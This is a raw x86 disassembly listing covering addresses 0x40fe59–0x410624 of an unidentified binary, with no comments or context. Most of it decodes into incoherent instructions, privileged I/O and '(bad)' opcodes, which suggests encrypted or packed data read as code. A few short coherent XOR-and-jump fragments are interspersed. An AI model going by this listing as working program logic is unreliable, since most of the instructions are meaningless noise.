  40fe59:	sub    edx,DWORD PTR [edi-0x32]
  40fe5c:	out    0x6b,al
  40fe5e:	sub    eax,0x723fd2f5
  40fe63:	mov    edi,0xe7e70c9
  40fe68:	jecxz  0x40fe6a
  40fe6a:	cmp    DWORD PTR [esi],eax
  40fe6c:	xchg   ecx,eax
  40fe6d:	cmp    bh,0x97
  40fe70:	leave  
  40fe71:	int3   
  40fe72:	jle    0x40fea0
  40fe74:	or     edx,DWORD PTR [ebx+edx*1+0x29]
  40fe78:	aaa    
  40fe79:	dec    ebx
  40fe7a:	hlt    
  40fe7b:	xchg   ebx,eax
  40fe7c:	in     eax,dx
  40fe7d:	enter  0x8734,0x3f
  40fe81:	and    BYTE PTR [edx],0x74
  40fe84:	sbb    DWORD PTR [edi-0x4b],edi
  40fe87:	xor    BYTE PTR [ecx-0x55],dh
  40fe8a:	push   esi
  40fe8b:	jnp    0x40fe33
  40fe8d:	jbe    0x40fe2f
  40fe8f:	mov    dl,0xfd
  40fe91:	dec    edi
  40fe92:	data16 loope 0x40fecb
  40fe95:	mov    dh,0x67
  40fe97:	mov    ds:0xbe34b941,eax
  40fe9c:	mov    edi,fs
  40fe9e:	pop    eax
  40fe9f:	jno    0x40fe63
  40fea1:	popa   
  40fea2:	inc    ebx
  40fea3:	jnp    0x40fe6d
  40fea5:	xchg   edi,eax
  40fea6:	fsubr  DWORD PTR [ebp-0xe]
  40fea9:	jno    0x40ff20
  40feab:	xchg   esp,eax
  40feac:	addr16 sti 
  40feae:	adc    DWORD PTR ds:0x44f6f58,0xffffffd2
  40feb5:	popa   
  40feb6:	sbb    BYTE PTR ds:0x456ab301,cl
  40febc:	push   eax
  40febd:	xor    ecx,DWORD PTR [ecx+0x47]
  40fec0:	cld    
  40fec1:	dec    esp
  40fec2:	pop    edi
  40fec3:	sbb    BYTE PTR [ebp+0x1b],ch
  40fec6:	pop    esi
  40fec7:	cmp    edi,DWORD PTR [ebx]
  40fec9:	jp     0x40ff13
  40fecb:	je     0x40ff34
  40fecd:	cmc    
  40fece:	mov    cl,0x3e
  40fed0:	aaa    
  40fed1:	ins    DWORD PTR es:[edi],dx
  40fed2:	jns    0x40ff1d
  40fed4:	dec    edi
  40fed5:	stc    
  40fed6:	mov    eax,0x15019ad7
  40fedb:	nop
  40fedc:	idiv   DWORD PTR [esi+0x22903426]
  40fee2:	dec    ecx
  40fee3:	cmp    al,0x63
  40fee5:	mov    fs,WORD PTR [edx]
  40fee7:	stc    
  40fee8:	loope  0x40fef8
  40feea:	(bad)  
  40feec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40feed:	sar    BYTE PTR [ecx],cl
  40feef:	push   0xfffffff1
  40fef1:	or     ecx,ebx
  40fef3:	jp     0x40feea
  40fef5:	out    0x23,eax
  40fef7:	add    BYTE PTR [ecx-0x6],dl
  40fefa:	mov    ebx,0x74a0d34e
  40feff:	xor    esp,ecx
  40ff01:	repnz add al,0x2b
  40ff04:	cmp    bh,BYTE PTR [ebp+0x371735d4]
  40ff0a:	in     eax,0xd2
  40ff0c:	lock and al,0x93
  40ff0f:	call   DWORD PTR [esi+0x5a]
  40ff12:	pop    ss
  40ff13:	pop    ss
  40ff14:	cmp    BYTE PTR [edi-0x181f1bff],al
  40ff1a:	jb     0x40ff7c
  40ff1c:	ret    
  40ff1d:	(bad)  
  40ff20:	cld    
  40ff21:	daa    
  40ff22:	pop    ebx
  40ff23:	aad    0x3b
  40ff25:	xor    DWORD PTR [esi+0x73],0xb09657a
  40ff2c:	js     0x40ff42
  40ff2e:	leave  
  40ff2f:	std    
  40ff30:	(bad)  
  40ff32:	mov    WORD PTR [edx],?
  40ff34:	pop    esp
  40ff35:	inc    esi
  40ff36:	and    DWORD PTR [edx+ebx*8],ebx
  40ff39:	xor    al,0xd2
  40ff3b:	sbb    al,0xbc
  40ff3d:	dec    esi
  40ff3e:	data16 fcom DWORD PTR [edx+0xcfacfb4]
  40ff45:	aad    0xf1
  40ff47:	cmp    esi,esi
  40ff49:	test   al,0xc
  40ff4b:	cmp    DWORD PTR [ebx],esi
  40ff4d:	jle    0x40fed5
  40ff4f:	fsubr  QWORD PTR [eax]
  40ff52:	leave  
  40ff53:	mov    ebx,0x3469fdd4
  40ff58:	gs in  al,dx
  40ff5a:	push   esp
  40ff5b:	push   ebx
  40ff5c:	push   edx
  40ff5d:	mov    bh,0x1a
  40ff5f:	xchg   DWORD PTR [ebx+ebx*1-0x61ce3875],ecx
  40ff66:	push   edx
  40ff67:	inc    ebp
  40ff68:	fcom   DWORD PTR [ebx+0x39]
  40ff6b:	loop   0x40ff6a
  40ff6d:	xchg   esp,eax
  40ff6e:	add    al,0xda
  40ff70:	push   ss
  40ff71:	push   esi
  40ff72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff73:	fcom   QWORD PTR [eax+0x57]
  40ff76:	add    eax,0x4e99bcba
  40ff7b:	lock mov ds:0x4218c8f9,eax
  40ff81:	mov    edx,0xe30f99fa
  40ff86:	pop    ecx
  40ff87:	mov    ebp,0xd4bd5038
  40ff8c:	pop    es
  40ff8d:	fistp  QWORD PTR [ebp+0x3e]
  40ff90:	push   0x55
  40ff92:	xchg   ebx,eax
  40ff93:	iret   
  40ff94:	mov    ebx,0x637127bc
  40ff99:	cmp    edx,DWORD PTR [ecx+eax*2]
  40ff9c:	sub    ah,cl
  40ff9e:	aas    
  40ff9f:	push   0x85f9dfb6
  40ffa4:	adc    cl,BYTE PTR [edi-0x12]
  40ffa7:	out    dx,eax
  40ffa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ffa9:	mov    ds,WORD PTR [esi]
  40ffab:	hlt    
  40ffac:	sbb    DWORD PTR [ecx+esi*1+0x16],edi
  40ffb0:	adc    eax,0x656ac622
  40ffb5:	adc    DWORD PTR ds:0xf2002b91,ebp
  40ffbb:	popf   
  40ffbc:	xor    al,0xf9
  40ffbe:	mov    al,0x70
  40ffc0:	fild   WORD PTR [eax+0x49cab7ad]
  40ffc6:	nop
  40ffc7:	and    ecx,DWORD PTR [esi+0x3555b84c]
  40ffcd:	arpl   WORD PTR [ebx-0x66],dx
  40ffd0:	add    al,0x3a
  40ffd2:	push   0x7ff9c949
  40ffd7:	aaa    
  40ffd8:	outs   dx,BYTE PTR ds:[esi]
  40ffd9:	pop    esp
  40ffda:	cmp    DWORD PTR [ecx],ebx
  40ffdc:	cmp    BYTE PTR [ecx-0x29260745],ah
  40ffe2:	retf   0x9fd7
  40ffe5:	aam    0xa4
  40ffe7:	add    eax,0x1498963d
  40ffec:	pop    ebp
  40ffed:	popa   
  40ffee:	xor    DWORD PTR es:[edi+0x3d],0x99c89418
  40fff6:	data16 ror BYTE PTR [ecx],1
  40fff9:	and    BYTE PTR [ebx-0x3b058d7d],al
  40ffff:	sub    edi,DWORD PTR [esi]
  410001:	into   
  410002:	push   esi
  410003:	mov    DWORD PTR [edx+edx*1-0x77],0xeb438ffd
  41000b:	or     edi,edi
  41000d:	mov    edx,ebx
  41000f:	je     0x41001b
  410011:	rcr    BYTE PTR ds:0xbce54c0d,0x29
  410018:	(bad)  
  410019:	cmp    esp,DWORD PTR [esi+eax*4+0x125e7d46]
  410020:	sub    eax,0xed3a3b9f
  410025:	jae    0x410003
  410027:	out    0xad,al
  410029:	je     0x410093
  41002b:	aaa    
  41002c:	outs   dx,BYTE PTR ds:[esi]
  41002d:	cmp    al,0xc1
  41002f:	cwde   
  410030:	in     al,dx
  410031:	mov    BYTE PTR [ebx-0x20d40fa3],cl
  410037:	cmp    ebx,edx
  410039:	ja     0x41004b
  41003f:	mov    edx,DWORD PTR [ebp-0x4]
  410042:	xor    edx,eax
  410044:	add    edx,ecx
  410046:	jmp    0x41220c
  41004b:	mov    edx,DWORD PTR [ebp-0x2c]
  41004e:	mov    edi,DWORD PTR [ebp-0x4]
  410051:	xor    edx,eax
  410053:	xor    edi,eax
  410055:	add    edi,ecx
  410057:	jmp    0x4102df
  41005c:	sar    DWORD PTR [eax+edx*8],cl
  41005f:	int    0xd7
  410061:	(bad)  
  410063:	ret    0x69c5
  410066:	xchg   ebx,eax
  410067:	daa    
  410068:	popf   
  410069:	stos   DWORD PTR es:[edi],eax
  41006a:	or     dl,BYTE PTR ds:0x787848e7
  410070:	in     eax,0x7e
  410072:	js     0x4100ec
  410074:	imul   ebp,DWORD PTR [edx],0xb4dd8b40
  41007a:	mov    ebp,0xd6cfa304
  41007f:	iret   
  410080:	mov    ah,0x0
  410082:	dec    eax
  410083:	sub    DWORD PTR [edx],0x52
  410086:	adc    al,0xdf
  410088:	sahf   
  410089:	mov    ds:0x65c310e8,eax
  41008e:	(bad)  
  41008f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410090:	jo     0x410021
  410092:	fsubr  DWORD PTR [eax]
  410094:	or     DWORD PTR [edi+0x359cf214],ebx
  41009a:	call   0xef4a:0xa6a7816e
  4100a1:	pop    ds
  4100a2:	sub    BYTE PTR [edi],cl
  4100a4:	fisttp DWORD PTR [ebp+0xa]
  4100a7:	(bad)  
  4100a8:	pop    esp
  4100a9:	test   eax,ecx
  4100ab:	daa    
  4100ac:	fld    st(1)
  4100ae:	jg     0x4100d8
  4100b0:	fild   WORD PTR [ebp+0x5a]
  4100b3:	dec    esp
  4100b4:	adc    edi,DWORD PTR [edx+0x30b22678]
  4100ba:	and    edi,ebp
  4100bc:	jecxz  0x410076
  4100be:	(bad)  [eax+ebp*8+0x16e97292]
  4100c5:	sbb    BYTE PTR [esi],dh
  4100c7:	stc    
  4100c8:	or     ecx,DWORD PTR [esi-0x45122d66]
  4100ce:	xchg   ebp,eax
  4100cf:	hlt    
  4100d0:	je     0x4100a7
  4100d2:	sbb    bh,BYTE PTR [edx+eiz*4+0xf6f0aae]
  4100d9:	xor    ah,BYTE PTR [ecx-0x1c5f3fad]
  4100df:	pop    ebp
  4100e0:	push   ebx
  4100e1:	mov    al,ds:0x955f2f6e
  4100e6:	aas    
  4100e7:	inc    ebp
  4100e8:	or     DWORD PTR [ebp-0x60a8bdac],ebx
  4100ee:	retf   
  4100ef:	add    esp,DWORD PTR [esi]
  4100f1:	out    0xed,eax
  4100f3:	mov    dh,0xc7
  4100f5:	xchg   esi,eax
  4100f6:	mov    bh,0x62
  4100f8:	xchg   eax,ebx
  4100fa:	clc    
  4100fb:	aaa    
  4100fc:	and    ebx,DWORD PTR [edx]
  4100fe:	mov    edi,DWORD PTR [ebp-0xb]
  410101:	out    dx,eax
  410102:	xor    BYTE PTR [ecx-0x58],0x30
  410106:	jno    0x4100ca
  410108:	cmp    BYTE PTR [edi],dl
  41010a:	cmp    DWORD PTR ds:0x6f73b9ba,esp
  410110:	lods   al,BYTE PTR ds:[esi]
  410111:	adc    al,0x7f
  410113:	ss enter 0xb6dd,0x8b
  410118:	xchg   ecx,eax
  410119:	add    bl,cl
  41011b:	mov    ebp,0x2ce6b71a
  410120:	cmp    eax,0xdb669348
  410125:	xor    eax,0xe7bfcd22
  41012a:	mov    ds:0x7dd83d0d,eax
  41012f:	ds mov esi,0x4c1c737f
  410135:	aaa    
  410136:	out    dx,eax
  410137:	sub    al,al
  410139:	ror    DWORD PTR [ebp-0x69349622],cl
  41013f:	gs repnz mov bh,0xaa
  410143:	and    ah,BYTE PTR [ecx+ebp*2-0x6]
  410147:	cmp    BYTE PTR [esp+eiz*2-0x7e],bl
  41014b:	xor    al,0xbe
  41014d:	add    DWORD PTR [esi],edi
  41014f:	shl    DWORD PTR [eax-0x4c],1
  410152:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410153:	sub    edi,0x14
  410156:	sbb    ebx,DWORD PTR [edi+0x5d]
  410159:	adc    bh,BYTE PTR [eax]
  41015b:	jne    0x4101bd
  41015d:	adc    DWORD PTR [ebp+0x6b538ddc],esi
  410163:	pop    esi
  410164:	hlt    
  410165:	adc    ebp,esi
  410167:	int3   
  410168:	in     eax,dx
  410169:	shl    BYTE PTR [edi+0x2e8c8cb],cl
  41016f:	jmp    0x410193
  410171:	push   eax
  410172:	in     eax,dx
  410173:	imul   DWORD PTR [edi-0x69]
  410176:	dec    eax
  410177:	enter  0x9547,0x32
  41017b:	jge    0x410122
  41017d:	test   DWORD PTR [ebx+0x5c],edx
  410180:	int3   
  410181:	pop    edi
  410182:	out    0xc6,eax
  410184:	sti    
  410185:	adc    BYTE PTR [esi-0xf],cl
  410188:	mov    es,esi
  41018a:	jge    0x41010f
  41018c:	add    bh,BYTE PTR [ebx+esi*8-0x1b]
  410190:	aad    0x3
  410192:	(bad)  
  410193:	lods   eax,DWORD PTR ds:[esi]
  410194:	into   
  410195:	mov    ds:0x30fdd7d9,eax
  41019a:	cs (bad) 
  41019c:	sub    BYTE PTR [edx+0x19],dl
  41019f:	jmp    DWORD PTR [ecx-0xc9a03e4]
  4101a5:	or     ebx,DWORD PTR [edx]
  4101a7:	mov    al,ds:0x7d685df2
  4101ac:	add    DWORD PTR [esi+edi*8+0x2d],0xea54b7c1
  4101b4:	(bad)
  4101b7:	jbe    0x410142
  4101b9:	loop   0x41018d
  4101bb:	adc    al,0xc8
  4101bd:	push   ebx
  4101be:	call   0x86c3:0x40505ebf
  4101c5:	arpl   WORD PTR [ebx],cx
  4101c7:	add    dl,dl
  4101c9:	out    0x33,eax
  4101cb:	push   ebp
  4101cc:	pushf  
  4101cd:	dec    esp
  4101ce:	test   ch,bl
  4101d0:	mov    esi,0x875b23d1
  4101d5:	outs   dx,BYTE PTR ds:[esi]
  4101d6:	data16 jge 0x4101d7
  4101d9:	arpl   WORD PTR [ecx],dx
  4101db:	or     dl,BYTE PTR [edx]
  4101dd:	jmp    0xfa55:0xafc85152
  4101e4:	pop    ds
  4101e5:	leave  
  4101e6:	sub    DWORD PTR [eax-0x1d89fa0b],0x32
  4101ed:	adc    edi,edi
  4101ef:	pop    edx
  4101f0:	mov    ah,0x22
  4101f2:	and    al,0x91
  4101f4:	mov    dl,0x7c
  4101f6:	sar    dl,0x5f
  4101f9:	loop   0x4101f2
  4101fb:	jne    0x410199
  4101fd:	mov    bh,0x6a
  4101ff:	je     0x410186
  410201:	sbb    eax,0x7ced618b
  410206:	lods   al,BYTE PTR ds:[esi]
  410207:	fstp   st(3)
  410209:	je     0x4101f4
  41020b:	ja     0x4101ef
  41020d:	out    0xd,al
  41020f:	push   es
  410210:	fnstenv [eax+esi*4+0x3f8c7d93]
  410217:	mov    al,0x34
  41021a:	retf   0x7b06
  41021d:	adc    ch,BYTE PTR [edx+esi*1]
  410220:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410221:	ins    DWORD PTR es:[edi],dx
  410222:	and    bh,dh
  410224:	enter  0x7b85,0xc8
  410228:	mov    al,ds:0x61f89afb
  41022d:	ficom  WORD PTR [esi+0x59a7c687]
  410233:	push   esi
  410234:	nop
  410235:	adc    dl,bh
  410237:	jmp    FWORD PTR [eax-0x70]
  41023a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41023b:	out    dx,al
  41023c:	gs loop 0x4101d0
  41023f:	adc    al,0xab
  410241:	aaa    
  410242:	lods   al,BYTE PTR ds:[esi]
  410243:	cmp    DWORD PTR [edx-0x54],edx
  410246:	pop    esp
  410247:	jg     0x410210
  410249:	and    dl,BYTE PTR [edi-0x1c989830]
  41024f:	pop    eax
  410250:	dec    ebp
  410251:	mov    esp,0x3fbbc905
  410256:	jle    0x4101ec
  410258:	es sbb eax,0x483c266a
  41025e:	inc    esi
  41025f:	js     0x410254
  410261:	mov    DWORD PTR [esi-0x5f1bf2ff],edi
  410267:	cli    
  410268:	dec    esp
  410269:	shl    BYTE PTR [edx],1
  41026b:	jg     0x410211
  41026d:	dec    ecx
  41026e:	cwde   
  41026f:	idiv   BYTE PTR [eax+esi*1]
  410272:	addr16 push edi
  410274:	adc    dh,ch
  410276:	nop
  410277:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410278:	out    0x70,eax
  41027a:	cmc    
  41027b:	sbb    eax,0x3b0d4a20
  410280:	mov    edx,0x1fcfb11d
  410285:	fidivr DWORD PTR [ecx-0x62]
  410288:	iret   
  410289:	aad    0xac
  41028b:	imul   esi,DWORD PTR [ebx-0x55],0xdfbf1690
  410292:	push   ecx
  410293:	jnp    0x41022b
  410295:	xchg   edx,eax
  410296:	xchg   ebp,eax
  410297:	and    DWORD PTR [ecx+esi*1],edx
  41029a:	jns    0x41021c
  41029c:	xor    BYTE PTR [eax-0x36],bl
  41029f:	fcom   DWORD PTR [edx]
  4102a1:	dec    esi
  4102a2:	dec    ebp
  4102a3:	inc    esp
  4102a4:	repnz xor edx,DWORD PTR [ebx-0x4c]
  4102a8:	push   eax
  4102a9:	cmp    ebx,DWORD PTR [edi]
  4102ab:	div    bl
  4102ad:	outs   dx,BYTE PTR ds:[esi]
  4102ae:	jle    0x4102b0
  4102b0:	stc    
  4102b1:	add    edi,esp
  4102b3:	cmp    DWORD PTR [esi],edi
  4102b5:	dec    ebp
  4102b6:	or     eax,0x5fef0699
  4102bb:	sbb    DWORD PTR [esi],edi
  4102bd:	mov    edx,0x353f1004
  4102c2:	cwde   
  4102c3:	fisttp QWORD PTR [ecx+0x571af473]
  4102c9:	push   ss
  4102ca:	inc    esp
  4102cb:	js     0x41028a
  4102cd:	inc    ecx
  4102ce:	mov    dh,ah
  4102d0:	fadd   QWORD PTR [ebx+0x7cdb74ad]
  4102d6:	and    DWORD PTR gs:[ebx],ecx
  4102d9:	div    BYTE PTR [edi+ecx*4-0x19]
  4102dd:	shl    DWORD PTR [esi+0x3],0xd1
  4102e1:	jmp    0x410569
  4102e6:	ret    
  4102e7:	int    0xc7
  4102e9:	into   
  4102ea:	(bad)  
  4102ec:	(bad)  
  4102ee:	xchg   BYTE PTR [edi],dh
  4102f0:	jle    0x410290
  4102f2:	jl     0x4102ee
  4102f4:	xor    eax,0x784e4c66
  4102f9:	js     0x4102e0
  4102fb:	jle    0x410375
  4102fd:	js     0x4102e1
  4102ff:	arpl   WORD PTR [edx],dx
  410301:	sbb    bh,BYTE PTR [esi]
  410303:	cmp    al,0x30
  410305:	jnp    0x410376
  410307:	call   0x753a:0xb4e575a7
  41030e:	fisttp QWORD PTR [ecx+ebp*1-0xe]
  410312:	loopne 0x410391
  410314:	ja     0x410311
  410316:	or     DWORD PTR [edi-0x5715c76f],0x3f2c7dcb
  410320:	jo     0x410374
  410322:	scas   eax,DWORD PTR es:[edi]
  410323:	mov    edx,0x24880cc1
  410328:	adc    eax,0xe1e3fce
  41032d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41032e:	xor    edi,DWORD PTR [ebx+0x3456bd9b]
  410334:	xor    al,ah
  410336:	icebp  
  410337:	mov    ebx,0xcbb7eb5b
  41033c:	mov    edx,0x52ed3ca6
  410341:	jg     0x410306
  410343:	xchg   esp,eax
  410344:	pop    ebp
  410345:	sub    al,0x7d
  410347:	lock stos DWORD PTR es:[edi],eax
  410349:	push   esp
  41034a:	enter  0x95c0,0x24
  41034e:	adc    edx,esp
  410350:	jg     0x410396
  410352:	or     eax,0x430c299f
  410357:	leave  
  410358:	mov    ?,edx
  41035a:	int3   
  41035b:	dec    ebx
  41035c:	sbb    esp,DWORD PTR [eax+0x6d]
  41035f:	pop    ecx
  410360:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410361:	scas   al,BYTE PTR es:[edi]
  410362:	fnstsw WORD PTR [ecx+0x3]
  410365:	je     0x4103de
  410367:	push   ebx
  410368:	aad    0x2a
  41036a:	push   edx
  41036b:	xor    al,0x89
  41036d:	lds    ebx,FWORD PTR [edi-0x6942efe7]
  410373:	and    eax,0x3f6d32ee
  410378:	in     al,0xbc
  41037a:	mul    BYTE PTR [ecx-0x14]
  41037d:	adc    DWORD PTR [edi+0x37],0xa3c83706
  410384:	adc    al,0x4a
  410386:	sbb    BYTE PTR [eax+0x4356ca7e],al
  41038c:	stos   DWORD PTR es:[edi],eax
  41038d:	mov    ecx,0x76b920e8
  410392:	xchg   edx,eax
  410393:	lock push esp
  410395:	sbb    bl,0xed
  410398:	mov    al,0x58
  41039a:	cmp    dh,BYTE PTR [ebp+0x20]
  41039d:	div    DWORD PTR [esi-0x154ff73a]
  4103a3:	bound  esi,QWORD PTR [edx-0x24]
  4103a6:	cli    
  4103a7:	mov    ebx,0x942caba4
  4103ac:	int3   
  4103ad:	or     al,0xe
  4103af:	push   ebp
  4103b0:	and    DWORD PTR [eax],esp
  4103b2:	cmp    DWORD PTR [esi+0x77],edx
  4103b5:	cli    
  4103b6:	(bad)  
  4103b7:	stos   BYTE PTR es:[edi],al
  4103b8:	xor    BYTE PTR [eax],dl
  4103ba:	ja     0x4103cf
  4103bc:	jmp    0xf8537bd6
  4103c1:	retf   
  4103c2:	call   0x29cc014b
  4103c7:	mov    edi,DWORD PTR [edx+0xd]
  4103ca:	lods   al,BYTE PTR ds:[esi]
  4103cb:	mov    dl,BYTE PTR [esi+esi*4+0x67107d23]
  4103d2:	imul   edx,DWORD PTR [ebp+0xd],0x139c7384
  4103d9:	(bad)  
  4103da:	and    bh,BYTE PTR [edi-0x1eadf705]
  4103e0:	mov    bl,0x2f
  4103e2:	lods   eax,DWORD PTR ds:[esi]
  4103e3:	fist   DWORD PTR [edx-0x1a496aea]
  4103e9:	mov    fs,WORD PTR [edx+eax*8-0x69ed86d6]
  4103f0:	outs   dx,DWORD PTR ds:[esi]
  4103f1:	outs   dx,BYTE PTR ds:[esi]
  4103f2:	jno    0x4103a1
  4103f4:	xor    BYTE PTR [esi],0x39
  4103f7:	fcomip st,st(1)
  4103f9:	ret    0x9934
  4103fc:	xchg   ebx,eax
  4103fd:	and    DWORD PTR [ecx-0x17],edx
  410400:	sub    DWORD PTR [edx+0x37],0x4a
  410404:	dec    eax
  410405:	stos   BYTE PTR es:[edi],al
  410406:	loop   0x4103e6
  410408:	mov    esp,0xacf9d57e
  41040d:	or     bh,BYTE PTR [esi-0x4cc13b47]
  410413:	pop    eax
  410414:	push   ebp
  410415:	rcl    DWORD PTR [eax-0x3692fff1],1
  41041b:	push   ds
  41041c:	add    cl,BYTE PTR [ecx+0x5fe76dc8]
  410422:	icebp  
  410423:	and    ebx,DWORD PTR [ecx+0x59]
  410426:	jne    0x410478
  410428:	sar    DWORD PTR [edi],cl
  41042a:	lea    esp,[ecx+0x59]
  41042d:	stc    
  41042e:	fisttp DWORD PTR ds:0x5e1a45e0
  410434:	jge    0x41041e
  410436:	mov    esp,0xd1489e7c
  41043b:	sub    ebp,esp
  41043d:	inc    edx
  41043e:	adc    eax,0xbbddd061
  410443:	pushf  
  410444:	into   
  410445:	nop
  410446:	mov    esi,0x4ccdcd87
  41044b:	inc    esi
  41044c:	ret    
  41044d:	mov    dl,0xce
  41044f:	cmp    al,0x9a
  410451:	pop    ebx
  410452:	jns    0x4104b8
  410454:	jl     0x4104c3
  410456:	inc    eax
  410457:	rcl    BYTE PTR [ecx+ebx*2+0x4e],cl
  41045b:	xchg   edx,eax
  41045c:	mov    WORD PTR [esi],?
  41045e:	and    eax,0xc050a62b
  410463:	jb     0x4103fc
  410465:	cld    
  410466:	ror    BYTE PTR [eax-0x50],cl
  410469:	in     eax,dx
  41046a:	sub    al,0x2e
  41046c:	ja     0x410492
  41046e:	xchg   edi,eax
  41046f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410470:	pop    ds
  410471:	pushf  
  410472:	jmp    0xada3:0x252abf6a
  410479:	inc    eax
  41047a:	fwait
  41047b:	cs mov eax,0xcb88abb2
  410481:	rol    DWORD PTR gs:[edi-0x429f8b87],0x5f
  410489:	and    eax,0x66d2b653
  41048e:	add    DWORD PTR [ebp+0x659fcd4a],edx
  410494:	ins    BYTE PTR es:[edi],dx
  410495:	popf   
  410496:	inc    esp
  410497:	mov    dh,0xaa
  410499:	dec    ecx
  41049a:	shl    DWORD PTR [edx],0xc
  41049d:	push   esi
  41049e:	pop    esi
  41049f:	cmp    BYTE PTR [ecx*2-0x1deebedf],ah
  4104a6:	adc    al,0x3d
  4104a8:	imul   eax,DWORD PTR [edi],0x11
  4104ab:	repz fild QWORD PTR [edi]
  4104ae:	xchg   ebx,eax
  4104af:	mov    cl,BYTE PTR [ecx+0x6b]
  4104b2:	add    eax,0x20df644b
  4104b7:	imul   ebx,DWORD PTR [ecx+0x64],0x18e154cb
  4104be:	stos   DWORD PTR es:[edi],eax
  4104bf:	aad    0x93
  4104c1:	pop    ebx
  4104c2:	mov    ebp,0xda73aa93
  4104c7:	cmp    eax,0x608bc1ef
  4104cc:	repz icebp 
  4104ce:	jge    0x410493
  4104d0:	enter  0x7378,0x15
  4104d4:	mov    ecx,ebp
  4104d6:	cmc    
  4104d7:	(bad)  
  4104d9:	mov    al,0xdd
  4104db:	push   cs
  4104dc:	mov    ebp,DWORD PTR ss:[esi]
  4104df:	jg     0x410477
  4104e1:	les    edi,FWORD PTR [edi]
  4104e3:	push   esi
  4104e4:	mov    ebx,0x1b449dd8
  4104e9:	outs   dx,BYTE PTR ds:[esi]
  4104ea:	aam    0x8a
  4104ec:	fcomp  DWORD PTR [edx]
  4104ee:	and    ah,BYTE PTR [esi-0x6]
  4104f1:	mov    fs,WORD PTR [eax]
  4104f3:	(bad)  
  4104f4:	pop    eax
  4104f5:	jb     0x410482
  4104f7:	dec    ebp
  4104f8:	mov    BYTE PTR [ecx+0x7d],ah
  4104fb:	imul   edx,DWORD PTR [edi],0x89dd58ac
  410501:	jge    0x4104ee
  410503:	adc    al,0x7e
  410505:	lock test cl,ah
  410508:	xchg   esi,eax
  410509:	test   al,0x1
  41050b:	adc    ebp,DWORD PTR [esi+0x11f6173a]
  410511:	mov    eax,0xcfc314be
  410516:	pop    ebx
  410517:	les    esi,FWORD PTR [esi+edi*8-0x80]
  41051b:	dec    esi
  41051c:	test   eax,esi
  41051e:	sbb    eax,0x5a5c1d03
  410523:	mul    BYTE PTR [esi]
  410525:	das    
  410526:	add    DWORD PTR [esp+eiz*8+0x4ca0142d],edi
  41052d:	xor    dl,bl
  41052f:	ins    BYTE PTR es:[edi],dx
  410530:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410531:	inc    esi
  410532:	cmp    ecx,ecx
  410534:	mov    dl,0xa4
  410536:	xor    bh,BYTE PTR [edi+0x2d262ab1]
  41053c:	xor    eax,0x81fa23c6
  410541:	imul   eax,ecx,0xe390561d
  410547:	xchg   edx,eax
  410548:	in     al,0x4b
  41054a:	fnsave [ecx-0x3c]
  41054d:	cmc    
  41054e:	outs   dx,BYTE PTR ds:[esi]
  41054f:	adc    eax,0x251c42ee
  410554:	lea    edi,[esi+ecx*2-0x59]
  410558:	sub    eax,0x2e15526c
  41055d:	jmp    0xd83b:0xec3ed521
  410564:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410565:	push   ebx
  410566:	xlat   BYTE PTR ds:[ebx]
  410567:	xor    ecx,DWORD PTR [ecx-0x742850f1]
  41056d:	jge    0x410567
  41056f:	mov    ebx,DWORD PTR [ebp-0x10]
  410572:	jmp    0x4107fa
  410577:	cmp    al,0xd6
  410579:	ret    0xdac3
  41057c:	fcmovnb st,st(1)
  41057e:	aad    0xe1
  410580:	pop    es
  410581:	adc    ah,BYTE PTR [ecx]
  410583:	not    BYTE PTR [ebp-0xd]
  410586:	cld    
  410587:	cmp    DWORD PTR [ebx+0x78],edx
  41058a:	js     0x410571
  41058c:	jle    0x410606
  41058e:	js     0x410608
  410590:	(bad)  
  410591:	fwait
  410592:	adc    dl,BYTE PTR [ecx+0xaec062c]
  410598:	nop
  410599:	leave  
  41059a:	xchg   esi,eax
  41059b:	dec    edx
  41059c:	sbb    al,0xeb
  41059e:	std    
  41059f:	pop    es
  4105a0:	push   es
  4105a1:	fnstenv [ecx-0x43]
  4105a4:	mov    cl,0x5a
  4105a6:	or     BYTE PTR ds:0xbb2f09cc,ah
  4105ac:	mov    eax,0x2e4df9f7
  4105b1:	or     ebp,esp
  4105b3:	stc    
  4105b4:	sub    al,0x36
  4105b6:	ror    DWORD PTR [ebp-0x117dd2db],cl
  4105bc:	das    
  4105bd:	not    BYTE PTR [esi+ecx*2-0x10]
  4105c1:	and    al,0x9f
  4105c3:	mov    bh,0xd1
  4105c5:	cwde   
  4105c6:	and    ah,BYTE PTR [eax+0x740aacf2]
  4105cc:	add    al,BYTE PTR [edi+ecx*8]
  4105cf:	call   0x1ecb:0xc8a3df2d
  4105d6:	pop    edi
  4105d7:	arpl   sp,sp
  4105d9:	(bad)  
  4105da:	push   esp
  4105db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105dc:	(bad)  
  4105dd:	sbb    ecx,DWORD PTR [esi-0xaaf6c1d]
  4105e3:	jp     0x41065f
  4105e5:	(bad)  
  4105e6:	sbb    eax,0xf92e2b41
  4105eb:	pop    ss
  4105ec:	sub    bl,BYTE PTR [esi]
  4105ee:	dec    esp
  4105ef:	in     eax,dx
  4105f0:	arpl   WORD PTR [ebx-0x33ac721a],bx
  4105f6:	inc    ebp
  4105f7:	mov    edi,0x841e5bed
  4105fc:	in     al,dx
  4105fd:	in     al,0x6d
  4105ff:	out    0x22,eax
  410601:	mov    esi,0x2aeeea85
  410606:	adc    DWORD PTR [edx-0x54e9a70c],esi
  41060c:	adc    al,0xdf
  41060e:	popa   
  41060f:	loope  0x410688
  410611:	int    0x74
  410613:	mov    dh,0x5
  410615:	xchg   edx,eax
  410616:	sbb    DWORD PTR [edi+0x26],0x7b
  41061a:	dec    ebp
  41061b:	cwde   
  41061c:	mov    dh,0x23
  41061e:	cmp    bl,BYTE PTR [ecx+0xcd3f6eb]
  410624:	push   ebp
